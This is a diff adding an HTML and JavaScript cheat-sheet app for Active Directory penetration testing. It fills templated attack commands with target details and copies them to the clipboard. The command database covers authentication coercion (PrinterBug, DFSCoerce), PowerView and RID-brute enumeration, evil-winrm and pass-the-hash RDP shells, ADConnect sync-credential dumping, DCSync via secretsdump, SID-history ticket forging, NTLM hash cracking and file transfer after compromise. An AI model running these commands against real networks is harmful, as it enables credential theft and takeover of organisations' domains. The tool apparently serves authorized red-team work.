+  {name:'PrinterBug (SpoolSample)',cmd:`python3 printerbug.py '{DOMAIN}/{USER}:{PASS}@{DC_IP}' {LHOST}`},
+  {name:'DFSCoerce',cmd:`python3 DFSCoerce.py -u '{USER}' -p '{PASS}' -d {DOMAIN} {LHOST} {DC_IP}`},
+  {name:'ShadowCoerce',cmd:`python3 shadowcoerce.py -u '{USER}' -p '{PASS}' -d {DOMAIN} {LHOST} {DC_IP}`},
+]},
+{id:113,cat:'Domain Abuse',icon:'👑',name:'Domain SID / Enum',desc:'SID lookup and host file management',tags:['enum'],
+variations:[
+  {name:'Generate + append hosts file',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' --generate-hosts-file /tmp/hosts.txt && tee -a /etc/hosts < /tmp/hosts.txt`},
+  {name:'Get domain SID (impacket)',cmd:`impacket-lookupsid '{DOMAIN}/{USER}:{PASS}@{DC_IP}' | grep 'Domain SID'`},
+  {name:'Get domain SID (nxc)',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' --get-sid`},
+  {name:'Enumerate users via RID',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' --rid-brute | grep '(SidTypeUser)'`},
+]},
+
+// ══ POWERVIEW ══
+{id:120,cat:'PowerView',icon:'⚡',name:'Domain Enumeration',desc:'Enumerate AD with PowerView / PowerSploit',tags:['enum','recon'],
+variations:[
+  {name:'Import PowerView',cmd:`. .\\PowerView.ps1`},
+  {name:'Get domain info',cmd:`Get-Domain; Get-DomainController -Domain {DOMAIN}`},
+  {name:'Get domain users',cmd:`Get-DomainUser | Select sAMAccountName,description,memberOf`},
+  {name:'Find admin users',cmd:`Get-DomainUser -AdminCount | Select sAMAccountName`},
+  {name:'Get computers',cmd:`Get-DomainComputer | Select dnsHostName,operatingSystem`},
+  {name:'Find local admins',cmd:`Find-LocalAdminAccess -Verbose`},
+  {name:'Get domain trust',cmd:`Get-DomainTrust`},
+  {name:'Get GPOs',cmd:`Get-DomainGPO | Select displayName,gpcFileSysPath`},
+  {name:'Enumerate group membership',cmd:`Get-DomainGroupMember 'Domain Admins' | Select MemberName`},
+  {name:'Find machines with sessions',cmd:`Find-DomainUserLocation | Select UserName,SessionFromName`},
+]},
+{id:121,cat:'PowerView',icon:'⚡',name:'ACL Enumeration',desc:'Find interesting ACLs with PowerView',tags:['acl','enum'],
+variations:[
+  {name:'Get object ACL',cmd:`Get-DomainObjectAcl -Identity '{TARGET_USER}' -ResolveGUIDs`},
+  {name:'Find interesting ACL',cmd:`Find-InterestingDomainAcl -ResolveGUIDs | Select IdentityReferenceName,ObjectDN,ActiveDirectoryRights`},
+  {name:'Check write perms',cmd:`Get-DomainObjectAcl -SearchBase 'DC={DOMAIN}' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}`},
+  {name:'Get GPO perms',cmd:`Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'Write' }`},
+]},
+
+// ══ ENUMERATION ══
+{id:130,cat:'Enumeration',icon:'🔭',name:'User Enumeration',desc:'Enumerate users from Active Directory',tags:['enum','recon'],
+variations:[
+  {name:'RID brute via NXC',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' --rid-brute 10000 | grep '(SidTypeUser)' | awk '{print $6}' | cut -d'\\' -f2 | tee users.txt`},
+  {name:'Users via NXC LDAP',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' --users | tee users_raw.txt`},
+  {name:'Users via ldeep',cmd:`ldeep ldap -u '{USER}' -p '{PASS}' -d {DOMAIN} -s ldap://{DC_IP} users`},
+  {name:'kerbrute userenum',cmd:`kerbrute userenum -d {DOMAIN} --dc {DC_IP} userlist.txt -o valid_users.txt`},
+  {name:'impacket GetADUsers',cmd:`impacket-GetADUsers '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} -all`},
+  {name:'Enumerate group membership (PS)',cmd:`Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | Select MemberName`},
+]},
+
+// ══ SHELLS / REMOTE ACCESS ══
+{id:140,cat:'Remote Access',icon:'💻',name:'WinRM / Evil-WinRM',desc:'Remote shell via WinRM / RDP',tags:['shell','lateral'],
+variations:[
+  {name:'evil-winrm (pass)',cmd:`evil-winrm -i {IP} -u '{USER}' -p '{PASS}'`},
+  {name:'evil-winrm (hash)',cmd:`evil-winrm -i {IP} -u '{USER}' -H '{HASH}'`},
+  {name:'evil-winrm (kerberos)',cmd:`KRB5CCNAME='{USER}.ccache' evil-winrm -i {DC_FQDN} -r {DOMAIN}`},
+  {name:'evil-winrm (SSL)',cmd:`evil-winrm -i {IP} -u '{USER}' -p '{PASS}' -S`},
+  {name:'xfreerdp (pass)',cmd:`xfreerdp /v:{IP} /u:{USER} /p:'{PASS}' /dynamic-resolution /drive:/tmp,share /clipboard`},
+  {name:'xfreerdp (hash)',cmd:`xfreerdp /v:{IP} /u:{USER} /pth:{HASH} /dynamic-resolution /clipboard`},
+  {name:'NXC check WinRM access',cmd:`nxc winrm {IP} -u '{USER}' -p '{PASS}'`},
+]},
+
+// ══ INITIAL ACCESS / NETWORK SCAN ══
+{id:150,cat:'Initial Recon',icon:'🌐',name:'Network Discovery',desc:'Discover hosts and services on internal network',tags:['recon','enum'],
+variations:[
+  {name:'nmap host discovery',cmd:`nmap -sn {IP}/24 -oG - | grep Up | awk '{print $2}' | tee hosts.txt`},
+  {name:'nmap AD ports',cmd:`nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 {IP} -sV -oA nmap_ad`},
+  {name:'nmap full fast',cmd:`nmap -sV -sC --open -T4 {IP} -oA nmap_full`},
+  {name:'netexec host sweep',cmd:`nxc smb {IP}/24 2>/dev/null | grep -v '\\[\\]'`},
+  {name:'netexec find DCs',cmd:`nxc smb {IP}/24 --dns-server {DC_IP} 2>/dev/null | grep 'domain'`},
+  {name:'enum4linux-ng full',cmd:`enum4linux-ng -A {IP} -u '{USER}' -p '{PASS}'`},
+  {name:'rpcclient null session',cmd:`rpcclient -U '' -N {IP} -c 'enumdomusers'`},
+]},
+
+// ══ HYBRID / ENTRA ID ══
+{id:160,cat:'Entra ID / Hybrid',icon:'☁',name:'Azure AD Connect',desc:'Attack hybrid AD environments',tags:['cloud','enum'],
+variations:[
+  {name:'AzureHound collect',cmd:`azurehound list -u '{USER}@{DOMAIN}' -p '{PASS}' -t https://login.microsoftonline.com -o azurehound.json`},
+  {name:'roadrecon gather',cmd:`roadrecon gather -u '{USER}@{DOMAIN}' -p '{PASS}'`},
+  {name:'roadrecon GUI',cmd:`roadrecon gui`},
+  {name:'NXC msol module (ADConnect creds)',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M msol`},
+  {name:'AADInternals dump sync creds',cmd:`Get-AADIntSyncCredentials`},
+  {name:'AADInternals get token',cmd:`$creds = Get-Credential; Get-AADIntAccessTokenForAADGraph -Credentials $creds`},
+  {name:'DCSync via ADConnect',cmd:`impacket-secretsdump '{DOMAIN}/MSOL_{hash}:{PASS}@{DC_IP}' -just-dc-ntlm`},
+]},
+
+// ══ TRUST ATTACKS ══
+{id:170,cat:'Trust Attacks',icon:'🔗',name:'Domain Trust Exploitation',desc:'Exploit cross-domain trusts',tags:['kerberos','privesc'],
+variations:[
+  {name:'Enumerate trusts (impacket)',cmd:`impacket-GetUserSPNs '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} -request`},
+  {name:'Enumerate trusts (ldeep)',cmd:`ldeep ldap -u '{USER}' -p '{PASS}' -d {DOMAIN} -s ldap://{DC_IP} trusts`},
+  {name:'Inter-realm TGT (Rubeus)',cmd:`.\Rubeus.exe asktgt /user:{TARGET_USER} /domain:{DOMAIN} /rc4:{HASH} /ptt`},
+  {name:'Cross-domain ticket request',cmd:`impacket-getST -spn 'cifs/{DC_FQDN}' -impersonate {TARGET_USER} '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} -additional-ticket '{USER}.ccache'`},
+  {name:'SID history attack',cmd:`impacket-ticketer -nthash {HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -extra-sid <trusted_domain_sid>-519 '{TARGET_USER}'`},
+]},
+
+// ══ MISC / UTILS ══
+{id:180,cat:'Utilities',icon:'🔧',name:'Post-Exploitation',desc:'Common post-exploitation tasks',tags:['shell','enum'],
+variations:[
+  {name:'Upload file (evil-winrm)',cmd:`upload /tmp/tool.exe C:\\Users\\Public\\tool.exe`},
+  {name:'Download file (evil-winrm)',cmd:`download C:\\Users\\{USER}\\Documents\\secret.txt /tmp/`},
+  {name:'SMB server (impacket)',cmd:`impacket-smbserver share /tmp -smb2support`},
+  {name:'HTTP server (python)',cmd:`python3 -m http.server {LWPORT}`},
+  {name:'Convert NT to hashcat (nthash)',cmd:`echo '{HASH}' | sed 's/^/\\$NT\\$/'`},
+  {name:'Crack NT hash (hashcat)',cmd:`hashcat -m 1000 '{HASH}' /usr/share/wordlists/rockyou.txt --force`},
+  {name:'Crack Net-NTLMv2 (hashcat)',cmd:`hashcat -m 5600 netntlm.hash /usr/share/wordlists/rockyou.txt --force`},
+  {name:'Convert ccache to kirbi (Rubeus)',cmd:`.\Rubeus.exe describe /ticket:<base64> /outfile:ticket.kirbi`},
+  {name:'Ticket base64 encode',cmd:`base64 -w0 '{USER}.ccache'`},
+  {name:'Check SMB signing',cmd:`nxc smb {IP}/24 --gen-relay-list unsigned.txt`},
+]},
+
+];
+
+// ─── STATE ───────────────────────────────────────────────────────────────────
+let activeCat = 'All';
+let selectedId = null;
+let selectedVar = 0;
+let searchQ = '';
+
+const CATS = () => ['All', ...new Set(DB.map(c=>c.cat))];
+
+function buildCats() {
+  const el = document.getElementById('cat-list');
+  el.innerHTML = CATS().map(c => {
+    const cnt = c==='All' ? DB.length : DB.filter(x=>x.cat===c).length;
+    return `<div class="cat-item${activeCat===c?' active':''}" onclick="setCat('${c}')">
+      <span class="cat-icon">${c==='All'?'📋':DB.find(x=>x.cat===c)?.icon||'📌'}</span>
+      <span class="cat-name">${c}</span>
+      <span class="cat-count">${cnt}</span>
+    </div>`;
+  }).join('');
+}
+
+function setCat(c) { activeCat=c; buildCats(); renderList(); }
+
+function getFiltered() {
+  return DB.filter(c => {
+    const cm = activeCat==='All'||c.cat===activeCat;
+    const qm = !searchQ||c.name.toLowerCase().includes(searchQ)||c.desc.toLowerCase().includes(searchQ)||c.tags.some(t=>t.includes(searchQ));
+    return cm&&qm;
+  });
+}
+
+function renderList() {
+  const items = getFiltered();
+  document.getElementById('hdr-cat').textContent = activeCat;
+  document.getElementById('hdr-cnt').textContent = items.length;
+  document.getElementById('cmd-list').innerHTML = items.map(c =>
+    `<div class="cmd-item${selectedId===c.id?' active':''}" onclick="select(${c.id})">
+      <div class="cmd-name">${c.icon||''} ${c.name}</div>
+      <div class="cmd-desc">${c.desc}</div>
+      <div class="cmd-tags">${c.tags.map(t=>`<span class="tag ${t}">${t}</span>`).join('')}</div>
+    </div>`
+  ).join('') || '<div style="padding:1rem;color:var(--text3);font-size:.72rem;text-align:center">No results</div>';
+}
+
+function select(id) {
+  selectedId=id; selectedVar=0;
+  renderList(); renderDetail();
+}
+
+function regen() { if(selectedId) renderDetail(); }
+
+function renderDetail() {
+  const cheat = DB.find(c=>c.id===selectedId);
+  if(!cheat) return;
+  document.getElementById('empty-state').style.display='none';
+  const dw = document.getElementById('detail-wrap');
+  dw.style.display='flex';
+  document.getElementById('d-title').textContent=`${cheat.icon||''} ${cheat.name}`;
+  document.getElementById('d-desc').textContent=cheat.desc;
+  document.getElementById('d-tags').innerHTML=cheat.tags.map(t=>`<span class="tag ${t}">${t}</span>`).join('');
+  document.getElementById('d-body').innerHTML = cheat.variations.map((v,i)=>{
+    const cmd = interp(v.cmd);
+    const hi = escH(cmd).replace(/\{(\w+)\}/g,'<span class="param">{$1}</span>');
+    const act = i===selectedVar?'border-color:var(--green)':'';
+    return `<div class="variation" style="${act}">
+      <div class="var-hdr"><span class="var-name">${v.name}</span><span style="color:var(--text3);font-size:.6rem">#${i+1}</span></div>
+      <div class="var-body">
+        <div class="cmd-box">${hi}</div>
+        <div class="var-actions">
+          <button class="vbtn primary" id="vb-${selectedId}-${i}" onclick="copyVar(${i})">📋 Copy</button>
+          <button class="vbtn" onclick="copyVar(${i},true)">📋 Copy+Enter</button>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function copyVar(idx, enter=false) {
+  const cheat = DB.find(c=>c.id===selectedId);
+  if(!cheat) return;
+  let cmd = interp(cheat.variations[idx].cmd);
+  if(enter) cmd+='\n';
+  navigator.clipboard.writeText(cmd).then(()=>{
+    const b=document.getElementById(`vb-${selectedId}-${idx}`);
+    if(b){b.textContent='✅ Copied!';b.classList.add('ok');setTimeout(()=>{b.textContent='📋 Copy';b.classList.remove('ok')},1400);}
+    toast('Copied!');
+  });
+}
+
+function onSearch() { searchQ=document.getElementById('search').value.toLowerCase().trim(); renderList(); }
+
+function doScan() {
+  const ip=v('scan-ip'), dom=v('scan-dom'), host=v('scan-host'), lh=v('scan-lhost');
+  if(ip){document.getElementById('g-ip').value=ip;document.getElementById('g-dc-ip').value=ip;}
+  if(dom){document.getElementById('g-domain').value=dom;}
+  if(host&&dom){
+    const fq=`${host}.${dom}`;
+    document.getElementById('g-hostname').value=host;
+    document.getElementById('g-fqdn').value=fq;
+    document.getElementById('g-dc-fqdn').value=fq;
+  }
+  if(lh) document.getElementById('g-lhost').value=lh;
+  closeModal('modal-scan'); regen(); toast(`Globals set for ${ip||'target'}`);
+}
+
+function clearGlobals() {
+  ['g-ip','g-lhost','g-lport','g-lwport','g-hostname','g-domain','g-fqdn','g-dc-ip','g-dc-fqdn','g-sid','g-krb5','g-prefix','g-user','g-pass','g-hash','g-ca','g-tuser','g-tmpl'].forEach(id=>{
+    document.getElementById(id).value='';
+  });
+  regen(); toast('Globals cleared');
+}
+
+function addCustom() {
+  const name=v('cc-name'),cat=v('cc-cat')||'Custom',desc=v('cc-desc')||'',cmd=v('cc-cmd');
+  if(!name||!cmd){toast('Name and Command required!');return;}
+  const id=Date.now();
+  DB.push({id,cat,icon:'✏️',name,desc,tags:['default'],variations:[{name:'Default',cmd}]});
+  closeModal('modal-custom');
+  buildCats(); renderList(); select(id); toast(`Added: ${name}`);
+  ['cc-name','cc-cat','cc-desc','cc-cmd'].forEach(x=>document.getElementById(x).value='');
+}
+
+function openModal(id){document.getElementById('modal-'+id).classList.add('open');}
+function closeModal(id){document.getElementById(id).classList.remove('open');}
+
+document.addEventListener('keydown',e=>{
+  const inInput = document.activeElement.tagName==='INPUT';
+  if(e.key==='/'&&!inInput){e.preventDefault();document.getElementById('search').focus();}
+  if(e.key==='Escape'){document.querySelectorAll('.moverlay.open').forEach(m=>m.classList.remove('open'));if(inInput)document.activeElement.blur();}
+  if(e.key==='ArrowDown'&&!inInput){e.preventDefault();nav(1);}
+  if(e.key==='ArrowUp'&&!inInput){e.preventDefault();nav(-1);}
+  if(e.key==='Enter'&&!inInput&&selectedId){e.preventDefault();copyVar(selectedVar);}
+  if(e.key==='Tab'&&selectedId){e.preventDefault();nextVar();}
+});
+
+function nav(d){
+  const f=getFiltered();if(!f.length)return;
+  const i=f.findIndex(c=>c.id===selectedId);
+  const n=Math.max(0,Math.min(f.length-1,i+d));
+  select(f[n].id);
+  document.querySelectorAll('.cmd-item')[n]?.scrollIntoView({block:'nearest'});
+}
+
+function nextVar(){
+  const c=DB.find(x=>x.id===selectedId);if(!c)return;
+  selectedVar=(selectedVar+1)%c.variations.length; renderDetail();
+}
+
+function escH(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+let _tt;
+function toast(msg){const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');clearTimeout(_tt);_tt=setTimeout(()=>t.classList.remove('show'),1800);}
+
+buildCats(); renderList(); select(DB[0].id);
+</script>
+</body>
+</html>
